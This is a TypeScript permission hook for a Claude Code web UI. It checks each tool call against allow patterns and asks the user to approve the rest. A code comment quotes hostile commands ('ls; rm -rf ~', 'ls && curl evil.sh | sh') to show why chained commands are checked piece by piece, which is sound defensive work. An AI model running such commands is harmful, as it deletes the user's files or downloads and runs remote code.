#!/usr/bin/env node
/**
 * PreToolUse Hook for Plum Code WebUI
 *
 * This script is configured as a PreToolUse hook in Claude Code settings.
 * It communicates with the WebUI backend to surface permission requests to the user.
 *
 * Flow:
 * 1. Claude Code calls this script before executing any tool
 * 2. We read the hook input from stdin (JSON)
 * 3. POST request to backend API, which emits to frontend via WebSocket
 * 4. Long-poll the backend until user responds or timeout (60 seconds max)
 * 5. Return the decision to Claude Code via stdout
 *
 * Environment variables:
 * - WEBUI_SESSION_ID: The session ID (required)
 * - WEBUI_BACKEND_URL: Backend URL (default: http://localhost:3006)
 *
 * Input (stdin JSON from Claude Code hook):
 * {
 *   "hook_event_name": "PreToolUse",
 *   "tool_name": "Bash",
 *   "tool_input": { "command": "rm -rf /tmp/test" },
 *   "session_id": "...",
 *   ...
 * }
 *
 * Output (stdout JSON) uses Claude Code's PreToolUse hookSpecificOutput:
 * {"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow"}}
 * A denied tool uses permissionDecision "deny" and a permissionDecisionReason.
 */

import * as readline from 'readline';
import * as http from 'http';
import * as https from 'https';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { URL } from 'url';
import * as crypto from 'crypto';

// Log to stderr so it doesn't interfere with stdout JSON output
function log(message: string): void {
  process.stderr.write(`[PERMISSION-HOOK] ${message}\n`);
}

// Settings file structure
interface ClaudeSettings {
  permissions?: {
    allow?: string[];
    deny?: string[];
  };
}

const PLAN_ALLOWED_TOOLS = new Set(['TodoWrite', 'ExitPlanMode']);

function resolveConfigHome(): string {
  const override = process.env.WEBUI_CONFIG_HOME || process.env.CLAUDE_CONFIG_HOME;
  if (override && override.trim()) {
    return override.trim();
  }
  return path.join(os.homedir(), '.claude');
}

// Load settings from a JSON file
function loadSettings(filePath: string): ClaudeSettings | null {
  try {
    if (fs.existsSync(filePath)) {
      const content = fs.readFileSync(filePath, 'utf-8');
      return JSON.parse(content) as ClaudeSettings;
    }
  } catch (err) {
    log(`Failed to load settings from ${filePath}: ${err}`);
  }
  return null;
}

// Get all allowed patterns from global and project settings
function getAllowedPatterns(configHome: string, projectPath?: string): string[] {
  const patterns: string[] = [];

  // Load global settings (~/.claude/settings.json)
  const globalSettingsPath = path.join(configHome, 'settings.json');
  const globalSettings = loadSettings(globalSettingsPath);
  if (globalSettings?.permissions?.allow) {
    patterns.push(...globalSettings.permissions.allow);
    log(`Loaded ${globalSettings.permissions.allow.length} patterns from global settings`);
  }

  // Load project settings (<project>/.claude/settings.local.json)
  if (projectPath) {
    const projectSettingsPath = path.join(projectPath, '.claude', 'settings.local.json');
    const projectSettings = loadSettings(projectSettingsPath);
    if (projectSettings?.permissions?.allow) {
      patterns.push(...projectSettings.permissions.allow);
      log(`Loaded ${projectSettings.permissions.allow.length} patterns from project settings`);
    }
  }

  return patterns;
}

// Get the value to match against for a given tool
function getMatchValue(toolName: string, toolInput: unknown): string {
  if (!toolInput || typeof toolInput !== 'object') {
    return '';
  }

  const inputObj = toolInput as Record<string, unknown>;

  switch (toolName) {
    case 'Bash':
      return String(inputObj.command || '');
    case 'Read':
    case 'Write':
    case 'Edit':
    case 'Glob':
      return String(inputObj.file_path || inputObj.pattern || '');
    case 'Grep':
      return String(inputObj.pattern || '');
    case 'WebFetch':
      return String(inputObj.url || '');
    case 'WebSearch':
      return String(inputObj.query || '');
    default:
      return '';
  }
}

// Shell chain/separator metacharacters. `Bash(ls:*)` must NOT auto-approve
// `ls; rm -rf ~` or `ls && curl evil.sh | sh` — every segment has to match
// the allowed prefix independently.
const BASH_CHAIN_REGEX = /\s*(?:;|&&|\|\||\|)\s*/;
// Command substitution spawns a subshell whose contents the prefix match
// cannot reason about. Backticks and $() are refused outright.
const BASH_SUBSTITUTION_REGEX = /`|\$\(/;

function matchBashPrefix(command: string, prefix: string): boolean {
  if (BASH_SUBSTITUTION_REGEX.test(command)) {
    return false;
  }
  const segments = command
    .split(BASH_CHAIN_REGEX)
    .map((s) => s.trim())
    .filter(Boolean);
  if (segments.length === 0) {
    return false;
  }
  return segments.every((segment) => segment.startsWith(prefix));
}

// Check if a tool invocation matches a pattern
// Pattern format: Tool(prefix:*) or Tool(:*) for any
function matchesPattern(pattern: string, toolName: string, toolInput: unknown): boolean {
  // Parse pattern: Tool(content:*) or Tool(:*)
  const match = pattern.match(/^(\w+)\((.*):\*\)$/);
  if (!match) {
    // Simple pattern like "Bash" matches all Bash calls
    return pattern === toolName;
  }

  const [, patternTool, patternPrefix] = match;

  // Tool name must match
  if (patternTool !== toolName) {
    return false;
  }

  // Empty prefix matches everything for this tool
  if (!patternPrefix) {
    return true;
  }

  // Get the value to match against
  const matchValue = getMatchValue(toolName, toolInput);

  if (toolName === 'Bash') {
    return matchBashPrefix(matchValue, patternPrefix);
  }

  // Check if the value starts with the pattern prefix
  return matchValue.startsWith(patternPrefix);
}

// Check if tool is auto-approved by any pattern
function isAutoApproved(toolName: string, toolInput: unknown, patterns: string[]): string | null {
  for (const pattern of patterns) {
    if (matchesPattern(pattern, toolName, toolInput)) {
      return pattern;
    }
  }
  return null;
}

// Types for hook input
interface HookInput {
  hook_event_name: string;
  tool_name: string;
  tool_input: unknown;
  session_id?: string;
}

interface BackendResponse {
  success: boolean;
  requestId?: string;
  approved?: boolean;
  error?: string;
}

// Output the hook decision (PreToolUse format)
// Uses hookSpecificOutput.permissionDecision: "allow" | "deny" | "ask"
function outputDecision(decision: 'allow' | 'deny', reason?: string): void {
  const output = {
    hookSpecificOutput: {
      hookEventName: 'PreToolUse',
      permissionDecision: decision,
      ...(reason && { permissionDecisionReason: reason }),
    },
  };
  log(`Outputting decision: ${JSON.stringify(output)}`);
  console.log(JSON.stringify(output));
}

// Read all input from stdin
function readStdin(): Promise<string> {
  return new Promise((resolve, reject) => {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout,
      terminal: false,
    });

    let data = '';
    rl.on('line', (line) => {
      data += line;
    });
    rl.on('close', () => {
      resolve(data);
    });
    rl.on('error', reject);

    // Handle case where stdin is already at EOF
    process.stdin.on('end', () => {
      rl.close();
    });
  });
}

// Make an HTTP request using only Node.js built-ins
function makeRequest(
  url: string,
  options: {
    method: 'GET' | 'POST';
    body?: string;
    timeout?: number;
  }
): Promise<BackendResponse> {
  return new Promise((resolve, reject) => {
    const parsedUrl = new URL(url);
    const isHttps = parsedUrl.protocol === 'https:';
    const client = isHttps ? https : http;

    const hookSecret = process.env.WEBUI_HOOK_SECRET || '';
    const webuiSessionId = process.env.WEBUI_SESSION_ID || '';

    const requestOptions = {
      hostname: parsedUrl.hostname,
      port: parsedUrl.port || (isHttps ? 443 : 80),
      path: parsedUrl.pathname + parsedUrl.search,
      method: options.method,
      headers: {
        'Content-Type': 'application/json',
        ...(hookSecret ? { 'X-Webui-Hook-Secret': hookSecret } : {}),
        ...(webuiSessionId ? { 'X-Webui-Session-Id': webuiSessionId } : {}),
        ...(options.body ? { 'Content-Length': Buffer.byteLength(options.body) } : {}),
      },
      timeout: options.timeout || 130000, // Default 130s to allow for 2min long-poll
    };

    const req = client.request(requestOptions, (res) => {
      let data = '';
      res.on('data', (chunk) => {
        data += chunk;
      });
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data) as BackendResponse;
          resolve(parsed);
        } catch {
          reject(new Error(`Invalid JSON response: ${data}`));
        }
      });
    });

    req.on('error', reject);
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Request timeout'));
    });

    if (options.body) {
      req.write(options.body);
    }
    req.end();
  });
}

// Format a description of the permission request
function formatDescription(tool: string, input: unknown): string {
  if (!input || typeof input !== 'object') {
    return `${tool} tool`;
  }

  const inputObj = input as Record<string, unknown>;

  switch (tool) {
    case 'Bash':
      return `Run command: ${String(inputObj.command || '').substring(0, 100)}`;
    case 'Read':
      return `Read file: ${inputObj.file_path}`;
    case 'Write':
      return `Write file: ${inputObj.file_path}`;
    case 'Edit':
      return `Edit file: ${inputObj.file_path}`;
    case 'Glob':
      return `Search files: ${inputObj.pattern}`;
    case 'Grep':
      return `Search content: ${inputObj.pattern}`;
    case 'WebFetch':
      return `Fetch URL: ${inputObj.url}`;
    case 'WebSearch':
      return `Web search: ${inputObj.query}`;
    default:
      return `${tool} tool`;
  }
}

// Generate a suggested pattern for the permission
function generateSuggestedPattern(tool: string, input: unknown): string {
  if (!input || typeof input !== 'object') {
    return `${tool}(:*)`;
  }

  const inputObj = input as Record<string, unknown>;

  switch (tool) {
    case 'Bash': {
      const command = String(inputObj.command || '');
      // Extract first word or two for the pattern
      const parts = command.split(/\s+/);
      if (parts.length >= 2) {
        return `Bash(${parts[0]} ${parts[1]}:*)`;
      }
      return `Bash(${parts[0]}:*)`;
    }
    case 'Read':
    case 'Write':
    case 'Edit': {
      const filePath = String(inputObj.file_path || '');
      // Extract directory pattern
      const lastSlash = filePath.lastIndexOf('/');
      if (lastSlash > 0) {
        const dir = filePath.substring(0, lastSlash + 1);
        return `${tool}(${dir}:*)`;
      }
      return `${tool}(:*)`;
    }
    default:
      return `${tool}(:*)`;
  }
}

async function main(): Promise<void> {
  const sessionId = process.env.WEBUI_SESSION_ID;
  const backendUrl = process.env.WEBUI_BACKEND_URL || 'http://localhost:3006';
  const projectPath = process.env.WEBUI_PROJECT_PATH || process.cwd();
  const sessionMode = (process.env.WEBUI_SESSION_MODE || '').toLowerCase();
  const configHome = resolveConfigHome();

  log(
    `Starting permission hook - sessionId: ${sessionId}, backendUrl: ${backendUrl}, projectPath: ${projectPath}, mode: ${sessionMode || 'unknown'}`
  );

  if (!sessionId) {
    // No session ID means we're not running in WebUI context
    // Exit with code 0 to let Claude Code use its default behavior
    log('No WEBUI_SESSION_ID, exiting to use default behavior');
    process.exit(0);
  }

  try {
    // Read hook input from stdin
    log('Reading stdin...');
    const stdinData = await readStdin();
    log(`Received stdin: ${stdinData.substring(0, 200)}...`);

    if (!stdinData.trim()) {
      // No input - exit to let Claude Code use default behavior
      log('Empty stdin, exiting to use default behavior');
      process.exit(0);
    }

    let hookInput: HookInput;
    try {
      hookInput = JSON.parse(stdinData) as HookInput;
      log(`Parsed hook input: event=${hookInput.hook_event_name}, tool=${hookInput.tool_name}`);
    } catch (parseErr) {
      // Invalid JSON - exit to let Claude Code use default behavior
      log(`Failed to parse JSON: ${parseErr}`);
      process.exit(0);
    }

    // Extract tool info from hook input
    const toolName = hookInput.tool_name;
    const toolInput = hookInput.tool_input;

    if (!toolName) {
      // No tool name - exit to let Claude Code use default behavior
      log('No tool_name in input, exiting to use default behavior');
      process.exit(0);
    }

    if (sessionMode === 'auto-accept' || sessionMode === 'danger') {
      log(`Auto-approved tool due to mode ${sessionMode || 'auto-accept'}`);
      outputDecision('allow');
      return;
    }

    if (sessionMode === 'planning') {
      if (PLAN_ALLOWED_TOOLS.has(toolName)) {
        log(`Allowed plan-mode tool: ${toolName}`);
        outputDecision('allow');
        return;
      }
      log(`Blocked tool in plan mode: ${toolName}`);
      outputDecision('deny', 'Plan mode: tool blocked');
      return;
    }

    // Load allowed patterns and check for auto-approval
    const allowedPatterns = getAllowedPatterns(configHome, projectPath);
    log(`Loaded ${allowedPatterns.length} allowed patterns total`);

    const matchedPattern = isAutoApproved(toolName, toolInput, allowedPatterns);
    if (matchedPattern) {
      log(`Auto-approved by pattern: ${matchedPattern}`);
      outputDecision('allow');
      return;
    }

    log(`No matching pattern found, surfacing to UI for user decision`);

    // Generate a unique request ID
    const requestId = crypto.randomUUID();
    log(`Generated requestId: ${requestId}`);

    // POST the permission request to the backend
    log(`POSTing to ${backendUrl}/api/permissions/request`);
    const postResult = await makeRequest(`${backendUrl}/api/permissions/request`, {
      method: 'POST',
      body: JSON.stringify({
        sessionId,
        requestId,
        toolName,
        toolInput,
        description: formatDescription(toolName, toolInput),
        suggestedPattern: generateSuggestedPattern(toolName, toolInput),
      }),
    });
    log(`POST result: ${JSON.stringify(postResult)}`);

    if (!postResult.success) {
      // Backend error - deny for safety
      log(`Backend returned error: ${postResult.error}`);
      outputDecision('deny', postResult.error || 'Backend error');
      return;
    }

    // Long-poll for user response (max 55 seconds to stay under 60s hook timeout)
    log(`Long-polling ${backendUrl}/api/permissions/response/${requestId}`);
    const pollResult = await makeRequest(`${backendUrl}/api/permissions/response/${requestId}`, {
      method: 'GET',
      timeout: 55000,
    });
    log(`Poll result: ${JSON.stringify(pollResult)}`);

    if (pollResult.approved) {
      log('User approved, outputting allow decision');
      outputDecision('allow');
    } else {
      log('User denied or timeout, outputting deny decision');
      outputDecision('deny', 'User denied permission');
    }
  } catch (err) {
    // On any error, deny for safety
    const message = err instanceof Error ? err.message : 'Unknown error';
    const stack = err instanceof Error ? err.stack : '';
    log(`Error occurred: ${message}`);
    if (stack) log(`Stack: ${stack}`);
    outputDecision('deny', message);
  }
}

main().catch((err) => {
  log(`Uncaught error: ${err}`);
  outputDecision('deny', 'Script error');
  process.exit(1);
});
